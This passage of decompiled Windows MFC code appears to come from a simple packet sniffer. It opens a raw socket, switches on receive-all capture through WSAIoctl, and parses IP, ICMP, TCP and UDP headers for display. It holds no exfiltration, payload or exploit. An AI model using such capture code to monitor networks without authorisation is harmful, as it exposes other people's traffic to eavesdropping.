  else {
    FUN_00403bc5((int)(param_1 + 0xe4));
    if (this != (CWnd *)0x0) {
      CWnd::SetWindowTextA(this,&DAT_004073a4);
    }
  }
  DAT_004076d8 = (uint)(DAT_004076d8 == 0);
  return;
}



void __fastcall FUN_00403128(void *param_1)

{
  LPRECT ptVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  int local_18 [4];
  int local_8;
  
  FUN_00403460(local_18);
  ptVar1 = (LPRECT)FUN_00403460(local_18);
  FUN_00403590(param_1,ptVar1);
  local_8 = FUN_00403470(local_18);
  local_8 = local_8 + -0x1e;
  iVar2 = FUN_00403490((int)local_18);
  iVar2 = iVar2 + -0x50;
  iVar3 = _ftol();
  iVar4 = FUN_00403470(local_18);
  iVar5 = FUN_00403490((int)local_18);
  iVar2 = _ftol(iVar5 + -0x50,iVar2);
  iVar5 = FUN_00401890((int)param_1 + 0xa0);
  if (iVar5 != 0) {
    CWnd::MoveWindow((CWnd *)((int)param_1 + 0xa0),0xf,0x41,local_8,iVar3,1);
  }
  if (*(int *)((int)param_1 + 0xfe) != 0) {
    iVar5 = FUN_00401890(*(int *)((int)param_1 + 0xfe));
    if (iVar5 != 0) {
      CWnd::MoveWindow(*(CWnd **)((int)param_1 + 0xfe),0xf,iVar3 + 0x50,iVar4 + -0x1e,iVar2 + -0xf,1
                      );
    }
  }
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  protected: void __thiscall CMFCColorPropertySheet::OnSize(unsigned int,int,int)
//  protected: void __thiscall CMFCToolBarButtonsListButton::OnSize(unsigned int,int,int)
//  protected: void __thiscall CVSListBoxBase::OnSize(unsigned int,int,int)
// 
// Library: Visual Studio 2010 Debug

void __thiscall OnSize(void *this,uint param_1,int param_2,int param_3)

{
  CWnd::OnSize((CWnd *)this,param_1,param_2,param_3);
  FUN_00403128(this);
  return;
}



void __thiscall FUN_00403274(void *this,undefined4 param_1,undefined4 *param_2)

{
  int iVar1;
  int *piVar2;
  
  iVar1 = FUN_00403840((int)this + 0xa0);
  if (-1 < iVar1) {
    piVar2 = (int *)CListCtrl::GetItemData((CListCtrl *)((int)this + 0xa0),iVar1);
    if (piVar2 != (int *)0x0) {
      FUN_0040116b(piVar2[1],*piVar2);
    }
  }
  *param_2 = 0;
  return;
}



void __fastcall FUN_004032df(int param_1)

{
  FUN_00402d19(param_1);
  FUN_0040116b(0x4076dc,0);
  return;
}



CDialog * __thiscall FUN_00403310(void *this,uint param_1)

{
  FUN_00403340((CDialog *)this);
  if ((param_1 & 1) != 0) {
    FUN_00401840(this);
  }
  return (CDialog *)this;
}



void __fastcall FUN_00403340(CDialog *param_1)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_004049a9;
  local_10 = ExceptionList;
  local_8 = 0;
  ExceptionList = &local_10;
  CString::~CString((CString *)(param_1 + 0x60));
  local_8 = 0xffffffff;
  CDialog::~CDialog(param_1);
  ExceptionList = local_10;
  return;
}



CDialog * __thiscall FUN_00403390(void *this,uint param_1)

{
  FUN_00402630((CDialog *)this);
  if ((param_1 & 1) != 0) {
    FUN_00401840(this);
  }
  return (CDialog *)this;
}



undefined4 * __fastcall FUN_004033c0(undefined4 *param_1)

{
  *param_1 = 0;
  param_1[1] = 0;
  return param_1;
}



void FUN_004033f0(uint param_1)

{
  operator_new(param_1);
  return;
}



bool __fastcall FUN_00403410(int *param_1)

{
  int iVar1;
  
  iVar1 = FUN_00403430(param_1);
  return *(int *)(iVar1 + 4) == 0;
}



int __fastcall FUN_00403430(int *param_1)

{
  return *param_1 + -0xc;
}



undefined4 FUN_00403450(void)

{
  AFX_MODULE_STATE *pAVar1;
  
  pAVar1 = AfxGetModuleState();
  return *(undefined4 *)(pAVar1 + 4);
}



undefined4 __fastcall FUN_00403460(undefined4 param_1)

{
  return param_1;
}



int __fastcall FUN_00403470(int *param_1)

{
  return param_1[2] - *param_1;
}



int __fastcall FUN_00403490(int param_1)

{
  return *(int *)(param_1 + 0xc) - *(int *)(param_1 + 4);
}



undefined4 __fastcall FUN_004034b0(int param_1)

{
  undefined4 local_c;
  
  if (param_1 == 0) {
    local_c = 0;
  }
  else {
    local_c = *(undefined4 *)(param_1 + 4);
  }
  return local_c;
}



void __thiscall FUN_004034e0(void *this,int param_1,int param_2,HICON param_3)

{
  DrawIcon(*(HDC *)((int)this + 4),param_1,param_2,param_3);
  return;
}



void __thiscall FUN_00403510(void *this,UINT param_1,UINT_PTR param_2,LPCSTR param_3)

{
  AppendMenuA(*(HMENU *)((int)this + 4),param_1,param_2,param_3);
  return;
}



void __thiscall FUN_00403540(void *this,BOOL param_1)

{
  HMENU pHVar1;
  
  pHVar1 = GetSystemMenu(*(HWND *)((int)this + 0x20),param_1);
  CMenu::FromHandle(pHVar1);
  return;
}



void __fastcall FUN_00403570(int param_1)

{
  IsIconic(*(HWND *)(param_1 + 0x20));
  return;
}



void __thiscall FUN_00403590(void *this,LPRECT param_1)

{
  GetClientRect(*(HWND *)((int)this + 0x20),param_1);
  return;
}



void __thiscall FUN_004035b0(void *this,LPARAM param_1,WPARAM param_2)

{
  SendMessageA(*(HWND *)((int)this + 0x20),0x80,param_2,param_1);
  return;
}



void __fastcall FUN_004035e0(CWnd *param_1)

{
  CWnd::Default(param_1);
  return;
}



void __fastcall FUN_00403600(CWnd *param_1)

{
  CWnd::Default(param_1);
  return;
}



void __thiscall FUN_00403620(void *this,uint param_1,CWnd *param_2)

{
  CDialog::Create((CDialog *)this,(char *)(param_1 & 0xffff),param_2);
  return;
}



undefined4 * __fastcall FUN_00403650(undefined4 *param_1)

{
  CWnd::CWnd((CWnd *)param_1);
  *param_1 = &PTR_LAB_00405940;
  return param_1;
}



CButton * __thiscall FUN_00403670(void *this,uint param_1)

{
  CButton::~CButton((CButton *)this);
  if ((param_1 & 1) != 0) {
    FUN_00401840(this);
  }
  return (CButton *)this;
}



void FUN_004036a0(uint param_1)

{
  LPCSTR lpIconName;
  HINSTANCE__ *hInstance;
  
  lpIconName = (LPCSTR)(param_1 & 0xffff);
  hInstance = AfxFindResourceHandle((char *)(param_1 & 0xffff),(char *)0xe);
  LoadIconA(hInstance,lpIconName);
  return;
}



undefined4 * __fastcall FUN_004036d0(undefined4 *param_1)

{
  CWnd::CWnd((CWnd *)param_1);
  *param_1 = &PTR_LAB_00405a04;
  return param_1;
}



CListCtrl * __thiscall FUN_004036f0(void *this,uint param_1)

{
  CListCtrl::~CListCtrl((CListCtrl *)this);
  if ((param_1 & 1) != 0) {
    FUN_00401840(this);
  }
  return (CListCtrl *)this;
}



void __fastcall FUN_00403720(int param_1)

{
  SendMessageA(*(HWND *)(param_1 + 0x20),0x1004,0,0);
  return;
}



void __thiscall FUN_00403750(void *this,int param_1,long param_2)

{
  CListCtrl::SetItem((CListCtrl *)this,param_1,0,4,(char *)0x0,0,0,0,param_2);
  return;
}



void __thiscall FUN_00403780(void *this,int param_1,char *param_2)

{
  CListCtrl::InsertItem((CListCtrl *)this,1,param_1,param_2,0,0,0,0);
  return;
}



void __thiscall FUN_004037b0(void *this,WPARAM param_1)

{
  SendMessageA(*(HWND *)((int)this + 0x20),0x1008,param_1,0);
  return;
}



void __thiscall FUN_004037e0(void *this,LPARAM param_1)

{
  SendMessageA(*(HWND *)((int)this + 0x20),0x1036,0,param_1);
  return;
}



void __fastcall FUN_00403810(int param_1)

{
  SendMessageA(*(HWND *)(param_1 + 0x20),0x1037,0,0);
  return;
}



void __fastcall FUN_00403840(int param_1)

{
  SendMessageA(*(HWND *)(param_1 + 0x20),0x1042,0,0);
  return;
}



void FUN_00403870(void)

{
  FUN_0040387f();
  FUN_00403890();
  return;
}



void FUN_0040387f(void)

{
  FUN_00404140(&DAT_004076e0,'\x01');
  return;
}



void FUN_00403890(void)

{
  FUN_004045ac(FUN_004038a2);
  return;
}



void FUN_004038a2(void)

{
  ~_Timer((undefined4 *)&DAT_004076e0);
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  public: __thiscall __crt_win32_buffer<char,struct
// __crt_win32_buffer_internal_dynamic_resizing>::__crt_win32_buffer<char,struct
// __crt_win32_buffer_internal_dynamic_resizing>(void)
//  public: __thiscall __crt_win32_buffer<wchar_t,struct
// __crt_win32_buffer_internal_dynamic_resizing>::__crt_win32_buffer<wchar_t,struct
// __crt_win32_buffer_internal_dynamic_resizing>(void)
// 
// Libraries: Visual Studio 2017 Debug, Visual Studio 2019 Debug

undefined4 * __fastcall __crt_win32_buffer<>(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_00405ac8;
  *(undefined4 *)((int)param_1 + 0x12) = 0;
  *(undefined4 *)((int)param_1 + 0x16) = 0;
  param_1[1] = 0;
  *(undefined4 *)((int)param_1 + 10) = 0xffffffff;
  *(undefined *)(param_1 + 2) = 0;
  return param_1;
}



void __fastcall FUN_004038f7(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_00405ac8;
  FUN_00403bc5((int)param_1);
  return;
}



void __thiscall FUN_00403913(void *this,undefined4 param_1,undefined4 param_2)

{
  *(undefined4 *)((int)this + 0x12) = param_1;
  *(undefined4 *)((int)this + 0x16) = param_2;
  return;
}



undefined4 FUN_00403932(int param_1)

{
  int iVar1;
  undefined1 unaff_BP;
  undefined auStack_1000c [65524];
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined *puStack_10;
  int local_8;
  
  FUN_004045d0(unaff_BP);
  local_8 = param_1;
  while( true ) {
    if (*(char *)(local_8 + 8) == '\0') {
      return 0;
    }
    if (*(char *)(local_8 + 8) == '\0') break;
    local_8 = 0;
    puStack_10 = auStack_1000c;
    uStack_14 = uRam0000000a;
    uStack_18 = 0x40397a;
    iVar1 = Ordinal_16();
    if (iVar1 == -1) {
      local_8 = 0x403989;
      iVar1 = Ordinal_111();
      if (iVar1 != 0x2733) {
        uRam00403991 = 0;
                    // WARNING: Read-only address (ram,0x00403991) is written
        return 0;
      }
    }
    else if ((iRam00000012 != 0) && (iRam00000016 != 0)) {
      puStack_10 = *(undefined **)(iVar1 + 0x12);
      uStack_14 = 0x4039c5;
      (**(code **)(iVar1 + 0x16))();
      local_8 = iVar1;
    }
  }
  return 0;
}



undefined4 __thiscall FUN_004039d5(void *this,undefined4 param_1)

{
  undefined4 uVar1;
  HANDLE pvVar2;
  undefined local_150 [256];
  int local_50;
  undefined4 local_4c;
  undefined4 local_48;
  undefined2 local_44;
  undefined2 local_42;
  undefined local_40 [12];
  int local_34;
  undefined local_30 [40];
  undefined4 local_8;
  
  uVar1 = Ordinal_23(2,3,0);
  *(undefined4 *)((int)this + 10) = uVar1;
  if (*(int *)((int)this + 10) == -1) {
    uVar1 = Ordinal_111();
  }
  else {
    local_34 = Ordinal_57(local_150,0x100);
    if (local_34 == -1) {
      uVar1 = Ordinal_111();
    }
    else {
      local_50 = Ordinal_52(local_150);
      *(undefined4 *)((int)this + 0xe) = param_1;
      local_44 = 2;
      local_42 = Ordinal_9(*(undefined2 *)((int)this + 0xe));
      memcpy(local_40,**(void ***)(local_50 + 0xc),(int)*(short *)(local_50 + 10));
      local_34 = Ordinal_2(*(undefined4 *)((int)this + 10),&local_44,0x10);
      if (local_34 == -1) {
        uVar1 = Ordinal_111();
      }
      else {
        local_48 = 1;
        local_34 = Ordinal_21(*(undefined4 *)((int)this + 10),0xffff,4,&local_48,4);
        local_48 = 1;
        local_34 = Ordinal_21(*(undefined4 *)((int)this + 10),0,2,&local_48,4);
        if (local_34 == -1) {
          uVar1 = Ordinal_111();
        }
        else {
          local_4c = 1;
          local_8 = 0;
          local_34 = WSAIoctl(*(undefined4 *)((int)this + 10),0x98000001,&local_4c,4,local_30,0x28,
                              &local_8,0,0);
          if (local_34 == -1) {
            uVar1 = Ordinal_111();
          }
          else {
            *(undefined *)((int)this + 8) = 1;
            pvVar2 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00403932,this,0,(LPDWORD)0x0);
            *(HANDLE *)((int)this + 4) = pvVar2;
            if (*(int *)((int)this + 4) == 0) {
              *(undefined *)((int)this + 8) = 0;
              Ordinal_3(*(undefined4 *)((int)this + 10));
              *(undefined4 *)((int)this + 10) = 0xffffffff;
              uVar1 = 0xffffffff;
            }
            else {
              uVar1 = 0;
            }
          }
        }
      }
    }
  }
  return uVar1;
}



void __fastcall FUN_00403bc5(int param_1)

{
  *(undefined *)(param_1 + 8) = 0;
  if (*(int *)(param_1 + 4) != 0) {
    TerminateThread(*(HANDLE *)(param_1 + 4),0);
    CloseHandle(*(HANDLE *)(param_1 + 4));
    *(undefined4 *)(param_1 + 4) = 0;
  }
  if (*(int *)(param_1 + 10) != 0) {
    Ordinal_3(*(undefined4 *)(param_1 + 10));
  }
  return;
}



undefined4 FUN_00403c1c(void)

{
  undefined4 uVar1;
  undefined local_110 [256];
  int local_10;
  int local_c;
  undefined4 local_8;
  
  local_c = Ordinal_57(local_110,0x100);
  if (local_c == -1) {
    uVar1 = 0;
  }
  else {
    local_10 = Ordinal_52(local_110);
    local_8 = *(undefined4 *)**(undefined4 **)(local_10 + 0xc);
    uVar1 = Ordinal_12(local_8);
  }
  return uVar1;
}



undefined * FUN_00403c6f(int param_1)

{
  int local_8;
  
  local_8 = 0;
  while( true ) {
    if (0xb < local_8) {
      return &DAT_004076e8;
    }
    if (*(int *)(&DAT_004073b0 + local_8 * 0x14) == param_1) break;
    local_8 = local_8 + 1;
  }
  return &DAT_004073b4 + local_8 * 0x14;
}



void FUN_00403cbb(byte *param_1,undefined4 param_2,char *param_3,char *param_4,char *param_5,
                 int *param_6)

{
  undefined2 uVar1;
  undefined2 uVar2;
  char *pcVar3;
  uint uVar4;
  int iVar5;
  undefined2 extraout_var;
  byte *pbVar6;
  undefined2 *puVar7;
  undefined2 extraout_var_00;
  undefined4 *puVar8;
  size_t sVar9;
  char local_108;
  undefined4 local_107;
  undefined4 local_103;
  undefined4 local_ff;
  undefined2 local_fb;
  undefined local_f9;
  undefined local_f8;
  undefined4 local_f7;
  int local_94;
  undefined4 local_90;
  size_t local_88;
  undefined4 local_7c;
  char local_78;
  undefined4 local_77;
  undefined4 local_3c;
  size_t local_34;
  undefined4 local_28;
  int local_24;
  char local_20;
  undefined4 local_1f;
  undefined4 local_1b;
  undefined4 local_17;
  undefined2 local_13;
  undefined local_11;
  char local_10 [4];
  undefined local_c;
  undefined local_b;
  byte *local_8;
  
  local_8 = (byte *)0x0;
  local_10[0] = 'F';
  local_10[1] = 0x53;
  local_10[2] = 0x52;
  local_10[3] = 0x50;
  local_c = 0x41;
  local_b = 0x55;
  local_20 = '\0';
  local_1f = 0;
  local_1b = 0;
  local_17 = 0;
  local_13 = 0;
  local_11 = 0;
  local_108 = '\0';
  local_107 = 0;
  local_103 = 0;
  local_ff = 0;
  local_fb = 0;
  local_f9 = 0;
  uVar4 = (uint)param_1[9];
  sVar9 = 0x10;
  pcVar3 = FUN_00403c6f(uVar4);
  strncpy(param_3,pcVar3,sVar9);
  sVar9 = *(size_t *)(param_1 + 0xc);
  local_88 = sVar9;
  pcVar3 = (char *)Ordinal_12(sVar9,0x10);
  strncpy(&local_20,pcVar3,sVar9);
  sVar9 = *(size_t *)(param_1 + 0x10);
  local_34 = sVar9;
  pcVar3 = (char *)Ordinal_12(sVar9,0x10);
  strncpy(&local_108,pcVar3,sVar9);
  local_78 = '\0';
  puVar8 = &local_77;
  for (iVar5 = 0xe; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar8 = 0;
    puVar8 = puVar8 + 1;
  }
  *(undefined2 *)puVar8 = 0;
  *(undefined *)((int)puVar8 + 2) = 0;
  local_f8 = 0;
  puVar8 = &local_f7;
  for (iVar5 = 0x18; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar8 = 0;
    puVar8 = puVar8 + 1;
  }
  *(undefined2 *)puVar8 = 0;
  *(undefined *)((int)puVar8 + 2) = 0;
  local_7c._0_2_ = 0;
  uVar2 = (undefined2)local_7c;
  local_7c._0_2_ = 0;
  local_28._0_2_ = 0;
  uVar1 = (undefined2)local_28;
  local_28._0_2_ = 0;
  local_24 = (*param_1 & 0xf) * 4;
  *param_6 = local_24;
  if (uVar4 == 1) {
    pbVar6 = param_1 + local_24;
    local_7c._0_2_ = uVar2;
    local_28._0_2_ = uVar1;
    sprintf(param_4,&DAT_004074e0,&local_20);
    sprintf(param_5,&DAT_004074e4,&local_108);
    sprintf(&local_78,s_type__d_code__d_004074e8,(uint)*pbVar6,(uint)pbVar6[1]);
  }
  else if (uVar4 == 6) {
    strcpy(&local_78,s_flag__004074a0);
    puVar7 = (undefined2 *)(param_1 + local_24);
    uVar2 = Ordinal_15(CONCAT22(extraout_var,*puVar7));
    local_7c = CONCAT22(local_7c._2_2_,uVar2);
    uVar2 = Ordinal_15(puVar7[1]);
    local_28 = CONCAT22(local_28._2_2_,uVar2);
    local_90 = CONCAT31(local_90._1_3_,1);
    for (local_94 = 0; local_94 < 6; local_94 = local_94 + 1) {
      if (((uint)*(byte *)((int)puVar7 + 0xd) & local_90 & 0xff) == 0) {
        sprintf(&local_78,&DAT_004074b0,&local_78,0x2d);
      }
      else {
        sprintf(&local_78,&DAT_004074a8,&local_78,(int)local_10[local_94]);
      }
      local_90 = CONCAT31(local_90._1_3_,(char)((local_90 & 0xff) << 1));
      local_3c = Ordinal_14(*(undefined4 *)(puVar7 + 2));
    }
    sprintf(param_4,s__s__d_004074b8,&local_20,local_7c & 0xffff);
    sprintf(param_5,s__s__d_004074c0,&local_108,local_28 & 0xffff);
    local_8 = param_1 + ((int)(*(byte *)(puVar7 + 6) & 0xf0) >> 4) * 4 + local_24;
    memcpy(&local_f8,local_8,3);
  }
  else if (uVar4 == 0x11) {
    puVar7 = (undefined2 *)(param_1 + local_24);
    local_7c._0_2_ = uVar2;
    local_28._0_2_ = uVar1;
    uVar2 = Ordinal_15(*puVar7);
    local_7c = CONCAT22(local_7c._2_2_,uVar2);
    uVar2 = Ordinal_15(puVar7[1]);
    local_28 = CONCAT22(local_28._2_2_,uVar2);
    uVar4 = Ordinal_15(CONCAT22(extraout_var_00,puVar7[2]));
    sprintf(&local_78,s_Len__d_004074c8,uVar4 & 0xffff);
    sprintf(param_4,s__s__d_004074d0,&local_20,local_7c & 0xffff);
    sprintf(param_5,s__s__d_004074d8,&local_108,local_28 & 0xffff);
  }
  else {
    local_7c._0_2_ = uVar2;
    local_28._0_2_ = uVar1;
    sprintf(param_4,&DAT_004074f8,&local_20);
    sprintf(param_5,&DAT_004074fc,&local_108);
  }
  return;
}



undefined4 * __thiscall FUN_00404110(void *this,uint param_1)

{
  FUN_004038f7((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}



undefined4 * __thiscall FUN_00404140(void *this,char param_1)

{
  *(undefined ***)this = &PTR_FUN_00405acc;
  *(undefined4 *)((int)this + 4) = 0;
  if (param_1 != '\0') {
    FUN_0040419f(this,2);
  }
  return (undefined4 *)this;
}



// Library Function - Multiple Matches With Same Base Name
//  protected: __thiscall Concurrency::details::_Timer::~_Timer(void)
//  protected: virtual __thiscall Concurrency::details::_Timer::~_Timer(void)
// 
// Libraries: Visual Studio 2010 Debug, Visual Studio 2012 Debug

void __fastcall ~_Timer(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_00405acc;
  if (param_1[1] != 0) {
    FUN_00404248(param_1);
  }
  return;
}



undefined4 __thiscall FUN_0040419f(void *this,uint param_1)

{
  int iVar1;
  undefined4 uVar2;
  uint local_194 [100];
  
  iVar1 = Ordinal_115(param_1 & 0xffff,local_194);
  if (iVar1 == 0) {
    if (((local_194[0] & 0xff) == (param_1 & 0xff)) &&
       ((local_194[0] & 0xffff) >> 8 == (param_1 & 0xffff) >> 8)) {
      *(undefined4 *)((int)this + 4) = 1;
      uVar2 = 0;
    }
    else {
      Ordinal_116();
      uVar2 = Ordinal_111();
    }
  }
  else {
    uVar2 = Ordinal_111();
  }
  return uVar2;
}



undefined4 __fastcall FUN_00404248(undefined4 param_1)

{
  Ordinal_116(param_1);
  return 0;
}



undefined4 __fastcall FUN_0040425b(int param_1)

{
  return *(undefined4 *)(param_1 + 4);
}



undefined4 * __thiscall FUN_00404270(void *this,uint param_1)

{
  ~_Timer((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}



int __thiscall CDialog::OnInitDialog(CDialog *this)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x004042aa. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = OnInitDialog(this);
  return iVar1;
}



int __thiscall CDialog::DoModal(CDialog *this)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x004042b0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = DoModal(this);
  return iVar1;
}



void __thiscall CEdit::~CEdit(CEdit *this)

{
                    // WARNING: Could not recover jumptable at 0x004043a6. Too many branches
                    // WARNING: Treating indirect jump as call
  ~CEdit(this);
  return;
}



void __thiscall CDialog::~CDialog(CDialog *this)

{
                    // WARNING: Could not recover jumptable at 0x004043ac. Too many branches
                    // WARNING: Treating indirect jump as call
  ~CDialog(this);
  return;
}



void __thiscall CDialog::CDialog(CDialog *this,uint param_1,CWnd *param_2)

{
                    // WARNING: Could not recover jumptable at 0x004043b2. Too many branches
                    // WARNING: Treating indirect jump as call
  CDialog(this,param_1,param_2);
  return;
}



void DDX_Control(CDataExchange *param_1,int param_2,CWnd *param_3)

{
                    // WARNING: Could not recover jumptable at 0x004043b8. Too many branches
                    // WARNING: Treating indirect jump as call
  DDX_Control(param_1,param_2,param_3);
  return;
}



void __thiscall CWnd::OnDestroy(CWnd *this)

{
                    // WARNING: Could not recover jumptable at 0x004043be. Too many branches
                    // WARNING: Treating indirect jump as call
  OnDestroy(this);
  return;
}



void __thiscall CString::~CString(CString *this)

{
                    // WARNING: Could not recover jumptable at 0x004043c4. Too many branches
                    // WARNING: Treating indirect jump as call
  ~CString(this);
  return;
}



void __thiscall CString::Empty(CString *this)

{
                    // WARNING: Could not recover jumptable at 0x004043ca. Too many branches
                    // WARNING: Treating indirect jump as call
  Empty(this);
  return;
}



void __thiscall CWnd::SetWindowTextA(CWnd *this,char *param_1)

{
                    // WARNING: Could not recover jumptable at 0x004043d0. Too many branches
                    // WARNING: Treating indirect jump as call
  SetWindowTextA(this,param_1);
  return;
}



CString * __thiscall CString::operator+=(CString *this,CString *param_1)

{
  CString *pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x004043d6. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = operator+=(this,param_1);
  return pCVar1;
}



CString * __thiscall CString::operator+=(CString *this,char *param_1)

{
  CString *pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x004043dc. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = operator+=(this,param_1);
  return pCVar1;
}



void __thiscall CString::Format(CString *this,char *param_1,...)

{
                    // WARNING: Could not recover jumptable at 0x004043e2. Too many branches
                    // WARNING: Treating indirect jump as call
  Format(this,param_1);
  return;
}



void __thiscall CString::CString(CString *this)

{
                    // WARNING: Could not recover jumptable at 0x004043e8. Too many branches
                    // WARNING: Treating indirect jump as call
  CString(this);
  return;
}



void __thiscall CString::CString(CString *this,char *param_1)

{
                    // WARNING: Could not recover jumptable at 0x004043ee. Too many branches
                    // WARNING: Treating indirect jump as call
  CString(this,param_1);
  return;
}



void __thiscall
CWnd::MoveWindow(CWnd *this,int param_1,int param_2,int param_3,int param_4,int param_5)

{
                    // WARNING: Could not recover jumptable at 0x004043f4. Too many branches
                    // WARNING: Treating indirect jump as call
  MoveWindow(this,param_1,param_2,param_3,param_4,param_5);
  return;
}



HBRUSH__ * __thiscall CDialog::OnCtlColor(CDialog *this,CDC *param_1,CWnd *param_2,uint param_3)

{
  HBRUSH__ *pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x004043fa. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = OnCtlColor(this,param_1,param_2,param_3);
  return pHVar1;
}



void __cdecl operator_delete(void *param_1)

{
                    // WARNING: Could not recover jumptable at 0x00404400. Too many branches
                    // WARNING: Treating indirect jump as call
  operator_delete(param_1);
  return;
}



long __thiscall CWnd::Default(CWnd *this)

{
  long lVar1;
  
                    // WARNING: Could not recover jumptable at 0x00404406. Too many branches
                    // WARNING: Treating indirect jump as call
  lVar1 = Default(this);
  return lVar1;
}



void __thiscall CWnd::CWnd(CWnd *this)

{
                    // WARNING: Could not recover jumptable at 0x00404430. Too many branches
                    // WARNING: Treating indirect jump as call
  CWnd(this);
  return;
}



void __thiscall CWinApp::CWinApp(CWinApp *this,char *param_1)

{
                    // WARNING: Could not recover jumptable at 0x004044b4. Too many branches
                    // WARNING: Treating indirect jump as call
  CWinApp(this,param_1);
  return;
}



void __thiscall CWinApp::~CWinApp(CWinApp *this)

{
                    // WARNING: Could not recover jumptable at 0x004044ba. Too many branches
                    // WARNING: Treating indirect jump as call
  ~CWinApp(this);
  return;
}



void * __cdecl operator_new(uint param_1)

{
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x004044c0. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = operator_new(param_1);
  return pvVar1;
}



void __cdecl AfxEnableControlContainer(COccManager *param_1)

{
                    // WARNING: Could not recover jumptable at 0x004044c6. Too many branches
                    // WARNING: Treating indirect jump as call
  AfxEnableControlContainer(param_1);
  return;
}



void __thiscall CButton::~CButton(CButton *this)

{
                    // WARNING: Could not recover jumptable at 0x004044cc. Too many branches
                    // WARNING: Treating indirect jump as call
  ~CButton(this);
  return;
}



void __thiscall CListCtrl::~CListCtrl(CListCtrl *this)

{
                    // WARNING: Could not recover jumptable at 0x004044d2. Too many branches
                    // WARNING: Treating indirect jump as call
  ~CListCtrl(this);
  return;
}



void __thiscall CDialog::OnCancel(CDialog *this)

{
                    // WARNING: Could not recover jumptable at 0x004044d8. Too many branches
                    // WARNING: Treating indirect jump as call
  OnCancel(this);
  return;
}



void __thiscall CDialog::OnOK(CDialog *this)

{
                    // WARNING: Could not recover jumptable at 0x004044de. Too many branches
                    // WARNING: Treating indirect jump as call
  OnOK(this);
  return;
}



CString * __thiscall CString::operator=(CString *this,char *param_1)

{
  CString *pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x004044e4. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = operator=(this,param_1);
  return pCVar1;
}



void DDX_Text(CDataExchange *param_1,int param_2,CString *param_3)

{
                    // WARNING: Could not recover jumptable at 0x004044ea. Too many branches
                    // WARNING: Treating indirect jump as call
  DDX_Text(param_1,param_2,param_3);
  return;
}



int __thiscall
CListCtrl::InsertColumn
          (CListCtrl *this,int param_1,char *param_2,int param_3,int param_4,int param_5)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x004044f0. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = InsertColumn(this,param_1,param_2,param_3,param_4,param_5);
  return iVar1;
}



int __thiscall CWnd::ShowWindow(CWnd *this,int param_1)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x004044f6. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = ShowWindow(this,param_1);
  return iVar1;
}



int __thiscall CString::LoadStringA(CString *this,uint param_1)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x004044fc. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = LoadStringA(this,param_1);
  return iVar1;
}



void __thiscall CPaintDC::~CPaintDC(CPaintDC *this)

{
                    // WARNING: Could not recover jumptable at 0x00404502. Too many branches
                    // WARNING: Treating indirect jump as call
  ~CPaintDC(this);
  return;
}



void __thiscall CPaintDC::CPaintDC(CPaintDC *this,CWnd *param_1)

{
                    // WARNING: Could not recover jumptable at 0x00404508. Too many branches
                    // WARNING: Treating indirect jump as call
  CPaintDC(this,param_1);
  return;
}



ulong __thiscall CListCtrl::GetItemData(CListCtrl *this,int param_1)

{
  ulong uVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040450e. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = GetItemData(this,param_1);
  return uVar1;
}



int __thiscall CListCtrl::SetItemText(CListCtrl *this,int param_1,int param_2,char *param_3)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00404514. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = SetItemText(this,param_1,param_2,param_3);
  return iVar1;
}



CWnd * __thiscall CWnd::GetDlgItem(CWnd *this,int param_1)

{
  CWnd *pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040451a. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = GetDlgItem(this,param_1);
  return pCVar1;
}



AFX_MODULE_STATE * AfxGetModuleState(void)

{
  AFX_MODULE_STATE *pAVar1;
  
                    // WARNING: Could not recover jumptable at 0x00404520. Too many branches
                    // WARNING: Treating indirect jump as call
  pAVar1 = AfxGetModuleState();
  return pAVar1;
}



CMenu * CMenu::FromHandle(HMENU__ *param_1)

{
  CMenu *pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x00404526. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = FromHandle(param_1);
  return pCVar1;
}



int __thiscall CDialog::Create(CDialog *this,char *param_1,CWnd *param_2)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040452c. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = Create(this,param_1,param_2);
  return iVar1;
}



HINSTANCE__ * AfxFindResourceHandle(char *param_1,char *param_2)

{
  HINSTANCE__ *pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00404544. Too many branches
                    // WARNING: Treating indirect jump as call
